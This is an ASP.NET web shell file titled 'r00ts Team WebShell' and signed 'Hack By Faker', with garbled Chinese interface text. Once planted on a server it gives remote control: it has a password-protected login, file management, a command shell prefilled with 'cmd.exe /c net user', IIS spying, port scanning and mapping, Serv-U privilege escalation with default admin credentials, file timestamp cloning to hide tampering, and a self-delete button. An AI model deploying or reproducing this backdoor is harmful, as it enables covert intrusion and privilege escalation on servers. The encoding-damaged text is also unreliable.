...
<script runat="server">
public string Password="b007bc64d4a1e28567baf728abe003c0";//r00ts
public string vbhLn="r00ts blackdoor";
public int TdgGU=1;
...
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('?ïÒé©í»??')){Bin_PostBack('hae','');};";
...
Bin_H2_Title.InnerText="ÙþËì(?)Î·×â >>";
krIR(AXSbb.Value);
}
public void fhAEn()
{
...
WICxe();
CzfO.Visible=true;
Bin_H2_Title.InnerText="ÙþËìÎ·×âÐï >>>>";
...
ZGKh.Text="<a href=\"javascript:if(confirm('?ïÒé©?ð¶ó®ÙþËì(?) ?')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\">?ð¶</a> | <a href='#' onclick=\"var filename=prompt('??ìýÙþËì?Ù£?:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \">ñìÙ¤Ù£</a>";
tr.Cells.Add(ZGKh);
UGzP.Rows.Add(tr);
}
...
GLpi.Text="<a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\">ù»?</a> | <a href='#' onclick=\"var filename=prompt('??ìýãæîÜÙþËìÙ£:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">?ð¤</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">??</a> | <a href='#' onclick=\"var filename=prompt('??ìýãæîÜÙþËìÙ£:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">ñìÙ¤Ù£</a> | <a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\">áóËÇÙþËì?àõ</a> ";
...
Bin_H2_Title.InnerHtml="?Ëï/??ÙþËì >>";
WICxe();
vrFA.Visible=true;
if(path.IndexOf(":")< 0)
{
...
{
Bin_H2_Title.InnerHtml="Ðº×ÌÙþËìîÜõÌý¨áóËÇ?? >>";
WICxe();
zRyG.Visible=true;
...
WICxe();
xWVQ.Visible=true;
Bin_H2_Title.InnerText="éÄ?(?)ãáãÓ >>";
...
WICxe();
ghaB.Visible=true;
Bin_H2_Title.InnerText="Í§?ãáãÓ >>";
Bin_H2_Mac.InnerText="??ãáãÓ >>";
Bin_H2_Driver.InnerText="??ãáãÓ >>";
...
WICxe();
APl.Visible=true;
Bin_H2_Title.InnerText="Serv-U ð«? >>";
}
public void lDODR()
{
...
WICxe();
hOWTm.Visible=true;
Bin_H2_Title.InnerText="Ó®Ï¢ç±ÞÒ >>";
}
...
WICxe();
yhv.Visible=true;
Bin_H2_Title.InnerText="ÙþËìâ¤ßã >>";
...
<title>r00ts Team WebShell</title>
<style type="text/css">
.Bin_Style_Login{font-size: 12px; font-family:System;background-color:#fff;border:2px solid #ddd;}
body,td{font: 12px System,Arial;line-height: 16px; background-color:Black; color:#FFFF37;}
...
a {color:#FFFF37;text-decoration: none;}a:hover{color:#FFFF37;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#000000;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#000000;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:BLACK;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:BLACK;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#EA0000;}
...
<div id="ljtzC" runat="server" style=" margin:300px 500px" enableviewstate="false" visible="false" >
<span style="COLOR: #F9F900; font:50px WST_Span;">r00ts Team WebShell</span>
<asp:TextBox ID="HRJ" runat="server" Columns="25" CssClass="Bin_Style_Login" ></asp:TextBox>
<asp:Button ID="ZSnXu" runat="server" Text="----------OK! Let's Go." CssClass="Bin_Style_Login" OnClick="xVm"/><p/>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="5%" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;">Hello! Hack.  By Faker</span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
<td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
<asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="÷ÜõóWebShell" ></asp:LinkButton> | <asp:LinkButton ID="RsqhW" runat="server" Text="ÙþËìÎ·×âÐï" OnClick="Ybg"></asp:LinkButton> | <asp:LinkButton ID="xxzE" runat="server" Text="Cmd Shell" OnClick="VOxn"></asp:LinkButton> | <asp:LinkButton ID="nuc" runat="server" Text="IIS÷®?" OnClick="KjPi"></asp:LinkButton> | <asp:LinkButton ID="OREpx" runat="server" Text="Í§??ïï" OnClick="Grxk"></asp:LinkButton> | <asp:LinkButton ID="jHN" runat="server" Text="Í§?Ü×?" OnClick="ilC"></asp:LinkButton> | <asp:LinkButton ID="PHq" runat="server" Text="éÄ?(?)ãáãÓ" OnClick="Olm"></asp:LinkButton> | <asp:LinkButton ID="wmgnK" runat="server" Text="Í§?ãáãÓ" OnClick="HtB"></asp:LinkButton> | <asp:LinkButton ID="FeV" runat="server" Text="ÙþËìâ¤ßã" OnClick="PPtK"></asp:LinkButton> | <asp:LinkButton ID="PVQ" runat="server" Text="Serv-Uð«?" OnClick="jXhS"></asp:LinkButton> | <asp:LinkButton ID="jNDb" runat="server" Text="ñ¼?øú?Ê×" OnClick="xSy"></asp:LinkButton> | <asp:LinkButton ID="HDQ" runat="server" Text="Ó®Ï¢?ÙÚ" OnClick="cptS" ></asp:LinkButton> | <asp:LinkButton ID="AoI" runat="server" Text="?Ëß?Î·×â" OnClick="dMx"></asp:LinkButton> | <asp:LinkButton ID="KHbEd" runat="server" Text="Ó®Ï¢ç±ÞÒ" OnClick="fDO"></asp:LinkButton>
</td>
</tr>
</table>
</div>
...
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 <tr>
<td style=" white-space:nowrap">?îñÙÍ? : </td>
<td style=" width:100%"><input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/>
</td>
<td style="white-space:nowrap" ><asp:Button ID="xaGwl" runat="server" Text="###?ìý###" CssClass="bt" OnClick="EXV"/></td>
 </tr>
</table>
...
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="ß¾?" OnClick="lbjLD"/></div><asp:LinkButton ID="OLJFp" runat="server" Text="?ó×ÙÍ?" OnClick="mcCY"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">ÙÊ?ÙÍ?</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">ãæËïÙÍ?</a>
 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">ÙÊ?í»?</a>
</td></tr>
<asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>ÙþËì(?)Ù£</asp:TableCell><asp:TableCell Width="25%">õÌý¨áóËÇ??</asp:TableCell><asp:TableCell Width="15%">ÓÞá³</asp:TableCell><asp:TableCell Width="25%">ðÃíÂ</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--FileEdit--%>
<div id="vrFA" runat="server">
<p>?îñÙþËì£¨?ËïãæîÜÙþËìÙ£ûúãæÙþËì£©<br/>
...
<p><asp:Button ID="JJjbW" runat="server" Text="ð«Îß" CssClass="bt" OnClick="DGCoW"/> <asp:Button ID="iCNu" runat="server" Text="Ú÷üÞ" CssClass="bt" OnClick="IkkO"/></p>
</div>
<%--CloneTime--%>
<div id="zRyG" runat="server" enableviewstate="false" visible="false">
<p>áóËÇÙþËì<br/><input class="input" id="QiFB" type="text" size="120" runat="server"/></p>
<p>?ÍÅÙþËì<br/><input class="input" id="lICp" type="text" size="120" runat="server"/></p>
<p><asp:Button ID="JEaxV" runat="server" Text="ð«Îß" CssClass="bt" OnClick="XXrLw"/></p>
<h2>?öÇõÌý¨áóËÇ?? &raquo;</h2>
<p>?îñÙþËì<br/><input class="input" id="pWVL" type="text" size="120" runat="server"/></p>
<p>
<asp:CheckBox ID="ZhWSK" runat="server" Text="ñþ?" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="SsR" runat="server" Text="Í§?" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="ccB" runat="server" Text="?íú" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="fbyZ" runat="server" Text="ðí?" EnableViewState="False"/>
</p>
<p>
?Ëï?? :
...
<p>
<asp:Button ID="kOG" CssClass="bt" runat="server" Text="ð«Îß" OnClick="tIykC"/>
</p>
</div>
<%--IISSpy--%>
...
<div runat="server" id="vIac">
 ...
 ?Ï£:<br/>
 <input class="input" runat="server" id="bkcm" value="/c set" type="text" size="100"/> <asp:Button ID="YrqL" CssClass="bt" runat="server" Text="#?ú¼Ù¤Öµ#" OnClick="FbhN"/>
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <td style="width:20%" align="left">éÄ?Ù£ : <input class="input" runat="server" id="dNohJ" type="text" size="20" value="localadministrator"/></td>
 <td style="width:20%" align="left">ÚË? : <input class="input" runat="server" id="NMd" type="text" size="20" value="#l@$ak#.lk;0@P"/></td>
 <td style="width:20%" align="left">Ó®Ï¢ : <input class="input" runat="server" id="HlQl" type="text" size="20" value="43958"/></td>
 <td style="width:10%"></td>
 </tr>
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="?ú¼" OnClick="lRfRj"/></td>
 </tr>
</table>
...
<p>ñ¼?øúÖØ? : <asp:TextBox id="qPdI" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="MoNA" runat="server" Text="#?Ê×#" CssClass="bt" onclick="RAFL"/></p>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
...
<tr align="center">
<td style="width:5%"></td>
<td style="width:20%" align="left">Üâò¢Ip : <input class="input" runat="server" id="eEpm" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">Üâò¢Ó®Ï¢ : <input class="input" runat="server" id="iXdh" type="text" size="20" value="3389"/></td>
<td style="width:20%" align="left">?ïïIp : <input class="input" runat="server" id="llH" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">?Ó®Ï¢ïï : <input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/></td></tr>
<tr align="center"><td colspan="5"><br/><asp:Button ID="FJE" CssClass="bt" runat="server" Text="ç±ÞÒÓ®Ï¢" OnClick="wDZ"/> <asp:Button ID="giX" CssClass="bt" runat="server" Text="?ð¶á¶êó" OnClick="vJNsE"/> <asp:Button ID="GFsm" CssClass="bt" runat="server" Text="áìãæ" OnClick="tYoZ"/></td></tr></table></div>
<%--Search--%>
...
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="rAQ" value="1"/> ÞÅéÄïá?øú?ãÒ</td>
</tr>
<tr align="center">
<td style="width:20%" align="left">ôð?</td>
<td style="width:60%" align="left"><textarea id="qPe" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="YZw"/> ôð?</td>
</tr>
<tr align="center">
<td style="width:20%" align="left">â¤ßãÙþËì?úþ</td>
...
<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name">ÙþËìÙ£?</asp:ListItem><asp:ListItem Value="content" Selected="True">ÙþËì?é»</asp:ListItem></asp:DropDownList></td>
</tr>
<tr align="center">
<td style="width:20%" align="left">ÖØ?</td>
<td style="width:60%" align="left"><input type="text" class="input" id="NaLJ" runat="server" style="width:100%" /></td>
<td style="width:20%" align="left"><asp:Button CssClass="bt" id="axy" runat="server" onclick="NBy" Text="?ã·" /></td>
</tr>
</table>
<br/>
<br/>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:black;">#### Hack By Faker ####</div>
</div>
</form>
</body>
</html>
